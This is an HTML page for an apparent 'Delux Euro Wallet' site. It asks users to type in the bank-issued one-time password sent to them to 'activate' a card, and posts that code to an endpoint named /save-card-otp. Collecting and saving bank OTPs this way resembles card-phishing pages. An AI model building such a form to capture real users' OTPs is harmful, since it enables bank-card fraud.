<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter OTP - Delux Euro Wallet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 18px;
            box-sizing: border-box;
            text-align: center;
            letter-spacing: 3px;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 5px rgba(102, 126, 234, 0.5);
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            margin-top: 20px;
        }
        button:hover {
            background: #5a67d8;
        }
        .back-link {
            display: block;
            margin-top: 20px;
            color: #666;
            text-decoration: none;
        }
        .back-link:hover {
            color: #333;
        }
        .info-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: left;
        }
        .info-box strong {
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Enter OTP</h1>
        <p>Please enter the OTP sent to your registered phone/email to activate your card.</p>
        
        <div class="info-box">
            <strong>Note:</strong> The OTP is typically sent by your bank/card issuer to verify the card.
        </div>
        
        <form id="otpForm" method="POST" action="/save-card-otp">
            <div class="form-group">
                <label for="otp">OTP</label>
                <input type="text" id="otp" name="otp" 
                       placeholder="Enter OTP" 
                       required>
            </div>
            
            <input type="hidden" id="cardId" name="cardId" value="">
            
            <button type="submit">Activate Card</button>
        </form>
        
        <a href="/cards.html" class="back-link">‚Üê Back to Cards</a>
    </div>

    <script>
        // Get card ID from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const cardId = urlParams.get('cardId');
        
        if (cardId) {
            document.getElementById('cardId').value = cardId;
        } else {
            // Try to get from session storage or redirect
            const storedCardId = sessionStorage.getItem('pendingCardId');
            if (storedCardId) {
                document.getElementById('cardId').value = storedCardId;
            } else {
                // No card ID found, redirect to cards page
                window.location.href = '/cards.html';
            }
        }

        // Auto-focus OTP input
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('otp').focus();
        });

        // Format OTP input (numbers only)
        document.getElementById('otp').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
